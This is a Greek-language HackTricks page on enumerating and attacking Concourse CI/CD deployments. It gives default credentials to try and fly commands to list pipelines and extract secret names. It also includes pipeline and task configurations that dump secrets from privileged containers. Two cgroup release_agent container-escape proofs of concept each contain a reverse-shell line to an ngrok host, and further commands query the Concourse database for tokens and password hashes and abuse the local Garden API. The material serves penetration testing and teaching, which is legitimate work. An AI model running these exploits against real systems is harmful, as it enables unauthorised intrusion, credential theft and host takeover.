# Concourse Enumeration & Attacks

## Απαρίθμηση και Επιθέσεις στο Concourse

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Ρόλοι Χρηστών & Δικαιώματα

Το Concourse έρχεται με πέντε ρόλους:

* _Concourse_ **Admin**: Αυτός ο ρόλος δίνεται μόνο στους ιδιοκτήτες της **κύριας ομάδας** (προεπιλεγμένη αρχική ομάδα του Concourse). Οι διαχειριστές μπορούν να **διαμορφώσουν άλλες ομάδες** (π.χ.: `fly set-team`, `fly destroy-team`...). Τα δικαιώματα αυτού του ρόλου δεν μπορούν να επηρεαστούν από το RBAC.
* **ιδιοκτήτης**: Οι ιδιοκτήτες της ομάδας μπορούν να **τροποποιήσουν τα πάντα μέσα στην ομάδα**.
* **μέλος**: Τα μέλη της ομάδας μπορούν να **διαβάσουν και να γράψουν** μέσα στα **αντικείμενα της ομάδας** αλλά δεν μπορούν να τροποποιήσουν τις ρυθμίσεις της ομάδας.
* **operator παραγωγής pipeline**: Οι operators παραγωγής pipeline μπορούν να εκτελέσουν **λειτουργίες pipeline** όπως ενεργοποίηση κατασκευών και ακινητοποίηση πόρων, όμως δεν μπορούν να ενημερώσουν τις ρυθμίσεις του pipeline.
* **θεατής**: Οι θεατές της ομάδας έχουν **πρόσβαση μόνο για ανάγνωση σε μια ομάδα** και τα pipelines της.

{% hint style="info" %}
Επιπλέον, τα **δικαιώματα των ρόλων ιδιοκτήτη, μέλους, operator παραγωγής pipeline και θεατή μπορούν να τροποποιηθούν** διαμορφώνοντας το RBAC (διαμορφώνοντας πιο συγκεκριμένα τις ενέργειές του). Διαβάστε περισσότερα σχετικά με αυτό στο: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Σημειώστε ότι το Concourse **ομαδοποιεί τα pipelines μέσα σε ομάδες**. Επομένως, οι χρήστες που ανήκουν σε μια ομάδα θα μπορούν να διαχειριστούν αυτά τα pipelines και **μπορεί να υπάρχουν πολλές ομάδες**. Ένας χρήστης μπορεί να ανήκει σε πολλές ομάδες και να έχει διαφορετικά δικαιώματα σε κάθε μία από αυτές.

### Μεταβλητές & Διαχειριστής Πιστοποιητικών

Στις διαμορφώσεις YAML μπορείτε να διαμορφώσετε τιμές χρησιμοποιώντας τη σύνταξη `((_source-name_:_secret-path_._secret-field_))`.\
[Από τα έγγραφα:](https://concourse-ci.org/vars.html#var-syntax) Το **όνομα πηγής είναι προαιρετικό**, και αν παραλειφθεί, θα χρησιμοποιηθεί ο [διαχειριστής πιστοποιητικών σε επίπεδο cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), ή η τιμή μπορεί να παρέχεται [στατικά](https://concourse-ci.org/vars.html#static-vars).\
Το **προαιρετικό \_secret-field**\_ καθορίζει ένα πεδίο στο ανακτημένο μυστικό για ανάγνωση. Εάν παραλειφθεί, ο διαχειριστής πιστοποιητικών μπορεί να επιλέξει να διαβάσει ένα 'προεπιλεγμένο πεδίο' από το ανακτημένο πιστοποιητικό εάν το πεδίο υπάρχει.\
Επιπλέον, οι _**secret-path**_ και _**secret-field**_ μπορεί να περικλείονται με διπλά εισαγωγικά `"..."` εάν **περιέχουν ειδικούς χαρακτήρες** όπως `.` και `:`. Για παράδειγμα, `((source:"my.secret"."field:1"))` θα ορίσει το _secret-path_ σε `my.secret` και το _secret-field_ σε `field:1`.

#### Στατικές Μεταβλητές

Οι στατικές μεταβλητές μπορούν να καθοριστούν στα **βήματα των εργασιών**:

```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```

Ή χρησιμοποιώντας τα ακόλουθα `fly` **όρισματα**:

* `-v` ή `--var` `NAME=VALUE` ορίζει το αλφαριθμητικό `VALUE` ως την τιμή για τη μεταβλητή `NAME`.
* `-y` ή `--yaml-var` `NAME=VALUE` αναλύει το `VALUE` ως YAML και το ορίζει ως την τιμή για τη μεταβλητή `NAME`.
* `-i` ή `--instance-var` `NAME=VALUE` αναλύει το `VALUE` ως YAML και το ορίζει ως την τιμή για τη μεταβλητή της περίπτωσης `NAME`. Δείτε [Ομαδοποίηση Αγωγών](https://concourse-ci.org/instanced-pipelines.html) για να μάθετε περισσότερα σχετικά με τις μεταβλητές της περίπτωσης.
* `-l` ή `--load-vars-from` `FILE` φορτώνει το `FILE`, ένα έγγραφο YAML που περιέχει την αντιστοίχιση των ονομάτων μεταβλητών σε τιμές και τις ορίζει όλες.

#### Διαχείριση Διαπιστευτηρίων

Υπάρχουν διάφοροι τρόποι με τους οποίους μπορεί να καθοριστεί ένας **Διαχειριστής Διαπιστευτηρίων** σε μια αγωγή, διαβάστε πώς στο [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Επιπλέον, το Concourse υποστηρίζει διάφορους διαχειριστές διαπιστευτηρίων:

* [Ο διαχειριστής διαπιστευτηρίων Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Ο διαχειριστής διαπιστευτηρίων CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Ο διαχειριστής διαπιστευτηρίων AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Ο διαχειριστής διαπιστευτηρίων AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Ο διαχειριστής διαπιστευτηρίων Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Ο διαχειριστής διαπιστευτηρίων Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Διαχείριση διαπιστευτηρίων προσωρινής αποθήκευσης](https://concourse-ci.org/creds-caching.html)
* [Απόκρυψη διαπιστευτηρίων](https://concourse-ci.org/creds-redacting.html)
* [Επανάληψη αποτυχημένων ανακτήσεων](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Σημειώστε ότι αν έχετε κάποια μορφή **πρόσβασης εγγραφής στο Concourse** μπορείτε να δημιουργήσετε εργασίες για να **διαρρεύσετε αυτά τα μυστικά** καθώς το Concourse πρέπει να μπορεί να τα αποκτήσει πρόσβαση.
{% endhint %}

### Απαρίθμηση Concourse

Για να απαριθμήσετε ένα περιβάλλον Concourse, πρέπει πρώτα να **συγκεντρώσετε έγκυρα διαπιστευτήρια** ή να βρείτε ένα **εξουσιοδοτημένο τοκέν** πιθανώς σε ένα αρχείο διαμόρφωσης `.flyrc`.

#### Σύνδεση και απαρίθμηση τρέχοντος χρήστη

* Για να συνδεθείτε, πρέπει να γνωρίζετε το **σημείο πρόσβασης**, το **όνομα ομάδας** (προεπιλογή είναι `main`) και μια **ομάδα στην οποία ανήκει ο χρήστης**:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Πάρτε τις **στόχους** που έχουν διαμορφωθεί:
* `fly targets`
* Ελέγξτε αν η σύνδεση με τον **στόχο** που έχει διαμορφωθεί είναι ακόμα **έγκυρη**:
* `fly -t <target> status`
* Πάρτε το **ρόλο** του χρήστη έναντι του στόχου που υποδεικνύεται:
* `fly -t <target> userinfo`

{% hint style="info" %}
Σημειώστε ότι το **διακριτικό API** αποθηκεύεται από προεπιλογή στο `$HOME/.flyrc`, οπότε αν κλέψετε μια μηχανή μπορείτε να βρείτε εκεί τα διαπιστευτήρια.
{% endhint %}

#### Ομάδες & Χρήστες

* Πάρτε μια λίστα με τις Ομάδες
* `fly -t <target> teams`
* Πάρτε τους ρόλους μέσα στην ομάδα
* `fly -t <target> get-team -n <team-name>`
* Πάρτε μια λίστα με τους χρήστες
* `fly -t <target> active-users`

#### Αγωγές

* **Λίστα** αγωγών:
* `fly -t <target> pipelines -a`
* **Πάρτε** το yaml της αγωγής (**ευαίσθητες πληροφορίες** μπορεί να βρεθούν στον ορισμό):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Πάρτε όλες τις **δηλωμένες μεταβλητές ρυθμίσεων** της αγωγής
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Πάρτε όλα τα **ονόματα μυστικών που χρησιμοποιούνται στις αγωγές** (αν μπορείτε να δημιουργήσετε/τροποποιήσετε μια εργασία ή να αποκτήσετε έλεγχο ενός container, μπορείτε να τα διαρρεύσετε):

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

#### Κοντέινερ & Εργαζόμενοι

* Λίστα **εργαζομένων**:
* `fly -t <target> workers`
* Λίστα **κοντέινερ**:
* `fly -t <target> containers`
* Λίστα **builds** (για να δείτε τι τρέχει):
* `fly -t <target> builds`

### Επιθέσεις στο Concourse

#### Βίαιη Δοκιμή Διαπιστευτηρίων

* admin:admin
* test:test

#### Απαρίθμηση Μυστικών και παραμέτρων

Στο προηγούμενο τμήμα είδαμε πώς μπορείτε να **πάρετε όλα τα ονόματα μυστικών και μεταβλητών** που χρησιμοποιούνται από το pipeline. Οι **μεταβλητές μπορεί να περιέχουν ευαίσθητες πληροφορίες** και το όνομα των **μυστικών θα είναι χρήσιμο αργότερα για να προσπαθήσετε να τα κλέψετε**.

#### Συνεδρία μέσα σε εκτελούμενο ή πρόσφατα εκτελεσμένο κοντέινερ

Εάν έχετε αρκετά προνόμια (**ρόλος μέλους ή περισσότερο**) θα μπορείτε να **καταλογογραφήσετε τα pipelines και τους ρόλους** και απλά να πάρετε μια **συνεδρία μέσα** στον κοντέινερ `<pipeline>/<job>` χρησιμοποιώντας:

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

Με αυτές τις άδειες μπορείς να:

* **Κλέψεις τα μυστικά** μέσα από το **container**
* Προσπαθήσεις να **δραπετεύσεις** στον κόμβο
* Απαριθμήσεις/Εκμεταλλευτείς το **metadata** του cloud (από το pod και από τον κόμβο, αν είναι δυνατόν)

#### Δημιουργία/Τροποποίηση Αγωγού

Αν έχεις αρκετά προνόμια (**ρόλος μέλους ή περισσότερο**), θα μπορείς να **δημιουργήσεις/τροποποιήσεις νέους αγωγούς**. Ελέγξτε αυτό το παράδειγμα:

```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

Με τη **τροποποίηση/δημιουργία** ενός νέου pipeline θα μπορείτε να:

* **Κλέψετε** τα **μυστικά** (μέσω της εμφάνισής τους ή μπαίνοντας μέσα στο container και εκτελώντας `env`)
* **Αποδράσετε** στον **κόμβο** (δίνοντάς σας αρκετά προνόμια - `privileged: true`)
* Απαριθμήστε/Καταχραστείτε το **metadata** endpoint του cloud (από το pod και από τον κόμβο)
* **Διαγράψτε** το δημιουργημένο pipeline

#### Εκτέλεση Προσαρμοσμένης Εργασίας

Αυτό είναι παρόμοιο με την προηγούμενη μέθοδο, αλλά αντί να τροποποιήσετε/δημιουργήσετε ένα ολόκληρο νέο pipeline, μπορείτε απλά να **εκτελέσετε μια προσαρμοσμένη εργασία** (που πιθανότατα θα είναι πολύ πιο **αόρατη**):

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

#### Απόδραση στον κόμβο από προνομιούχα εργασία

Στα προηγούμενα τμήματα είδαμε πώς να **εκτελέσουμε μια προνομιούχα εργασία με το concourse**. Αυτό δεν δίνει στον container ακριβώς την ίδια πρόσβαση με την προνομιούχα σημαία σε ένα docker container. Για παράδειγμα, δεν θα δείτε τη συσκευή αρχείου συστήματος του κόμβου στο /dev, οπότε η απόδραση μπορεί να είναι πιο "πολύπλοκη".

Στο παρακάτω PoC θα χρησιμοποιήσουμε το release\_agent για να αποδράσουμε με μερικές μικρές τροποποιήσεις:

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}
Όπως μπορείτε να παρατηρήσετε, αυτό είναι απλά ένα [**απόδραση του release\_agent**](https://github.com/carlospolop/hacktricks-cloud/blob/gr/pentesting-ci-cd/concourse-security/broken-reference/README.md) με την τροποποίηση της διαδρομής της εντολής στον κόμβο
{% endhint %}

#### Απόδραση στον κόμβο από έναν εργατικό container

Μια απλή απόδραση του release\_agent με μια μικρή τροποποίηση είναι αρκετή για αυτό:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

#### Απόδραση στον κόμβο από τον δοχείο του Ιστού

Ακόμα κι αν το δοχείο του Ιστού έχει απενεργοποιημένες ορισμένες αμυντικές μηχανισμούς, δεν εκτελείται ως ένα κοινό προνομιούχο δοχείο (για παράδειγμα, δεν μπορείτε να κάνετε mount και οι δυνατότητες είναι πολύ περιορισμένες), οπότε όλοι οι εύκολοι τρόποι για να αποδράσετε από το δοχείο είναι άχρηστοι.

Ωστόσο, αποθηκεύει τα τοπικά διαπιστευτήρια σε καθαρό κείμενο:

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

Μπορείτε να χρησιμοποιήσετε αυτές τις πιστοποιήσεις για να **συνδεθείτε στον διακομιστή ιστού** και να **δημιουργήσετε ένα προνομιούχο container και να δραπετεύσετε στον κόμβο**.

Στο περιβάλλον μπορείτε επίσης να βρείτε πληροφορίες για να **αποκτήσετε πρόσβαση στην εγκατάσταση postgresql** που χρησιμοποιεί το concourse (διεύθυνση, **όνομα χρήστη**, **κωδικό πρόσβασης** και άλλες πληροφορίες για τη βάση δεδομένων):

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

#### Κατάχρηση της υπηρεσίας Garden - Δεν είναι πραγματική επίθεση

{% hint style="warning" %}
Αυτές είναι απλά μερικές ενδιαφέρουσες σημειώσεις για την υπηρεσία, αλλά επειδή ακούει μόνο στο localhost, αυτές οι σημειώσεις δεν θα έχουν κανένα αντίκτυπο που δεν έχουμε ήδη εκμεταλλευτεί προηγουμένως.
{% endhint %}

Από προεπιλογή, κάθε εργαζόμενος του Concourse θα εκτελεί μια υπηρεσία [**Garden**](https://github.com/cloudfoundry/garden) στη θύρα 7777. Αυτή η υπηρεσία χρησιμοποιείται από τον διαχειριστή του ιστότοπου για να υποδείξει στον εργαζόμενο **τι χρειάζεται να εκτελέσει** (να κατεβάσει την εικόνα και να εκτελέσει κάθε εργασία). Αυτό ακούγεται πολύ καλό για έναν επιτιθέμενο, αλλά υπάρχουν μερικές καλές προστασίες:

* Είναι απλά **προσβάσιμο τοπικά** (127.0.0.1) και νομίζω ότι όταν ο εργαζόμενος επαληθεύεται ξανά από τον ιστό με την ειδική υπηρεσία SSH, δημιουργείται ένας σωλήνας, έτσι ώστε ο ιστός να **επικοινωνεί με κάθε υπηρεσία Garden** μέσα σε κάθε εργαζόμενο.
* Ο ιστός **παρακολουθεί τα εκτελούμενα δοχεία κάθε λίγα δευτερόλεπτα**, και τα **αναπάντεχα** δοχεία **διαγράφονται**. Έτσι, αν θέλετε να **εκτελέσετε ένα προσαρμοσμένο δοχείο**, πρέπει να **παρεμβάλετε** στη **επικοινωνία** μεταξύ του ιστού και της υπηρεσίας garden.

Οι εργαζόμενοι του Concourse λειτουργούν με υψηλά προνόμια δοχείου:

```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

Ωστόσο, τεχνικές όπως η **προσάρτηση** της συσκευής /dev του κόμβου ή του release\_agent **δεν θα λειτουργήσουν** (καθώς η πραγματική συσκευή με το σύστημα αρχείων του κόμβου δεν είναι προσβάσιμη, μόνο μια εικονική). Δεν μπορούμε να έχουμε πρόσβαση στις διεργασίες του κόμβου, οπότε η διαφυγή από τον κόμβο χωρίς εκμετάλλευση του πυρήνα γίνεται περίπλοκη.

{% hint style="info" %}
Στην προηγούμενη ενότητα είδαμε πώς να διαφύγουμε από ένα προνομιούχο container, οπότε αν μπορούμε να **εκτελέσουμε** εντολές σε ένα **προνομιούχο container** που δημιουργήθηκε από τον **τρέχοντα** **εργαζόμενο**, θα μπορούσαμε να **διαφύγουμε στον κόμβο**.
{% endhint %}

Να σημειωθεί ότι παίζοντας με το concourse παρατήρησα ότι όταν δημιουργείται ένα νέο container για να εκτελέσει κάτι, οι διεργασίες του container είναι προσβάσιμες από τον εργαζόμενο container, οπότε είναι σαν να δημιουργείται ένα νέο container μέσα σε αυτό.

**Εισβολή σε ένα εκτελούμενο προνομιούχο container**

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

**Δημιουργία ενός νέου προνομιούχου container**

Μπορείτε πολύ εύκολα να δημιουργήσετε ένα νέο container (απλά εκτελέστε ένα τυχαίο UID) και να εκτελέσετε κάτι πάνω σε αυτό:

```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

Ωστόσο, ο διακομιστής ιστού ελέγχει κάθε λίγα δευτερόλεπτα τα ενεργά δοχεία και αν ανιχνευθεί ένα αναπάντεχο, θα διαγραφεί. Καθώς η επικοινωνία γίνεται μέσω HTTP, μπορείτε να παρεμβάλετε στην επικοινωνία για να αποφύγετε τη διαγραφή αναπάντεχων δοχείων:

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

## Αναφορές

* https://concourse-ci.org/vars.html

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
